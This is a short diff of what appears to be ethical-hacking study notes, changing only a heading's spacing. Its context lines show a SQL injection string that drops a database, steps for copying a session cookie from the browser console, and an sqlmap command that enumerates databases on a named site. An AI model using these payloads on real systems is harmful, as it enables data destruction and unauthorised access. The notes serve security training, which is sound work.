@@ -212,7 +212,7 @@ blah'; DROP DATABASE mydatabase; --
 ```
 
 #### SQLmap
-#####Inspect page, in the console page, type document.cookie in the lower-left corner of the browser, and press Enter. Select the cookie value, then right-click and copy it
+##### Inspect page, in the console page, type document.cookie in the lower-left corner of the browser, and press Enter. Select the cookie value, then right-click and copy it
 #### Check databases
 ```bash
 sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs 
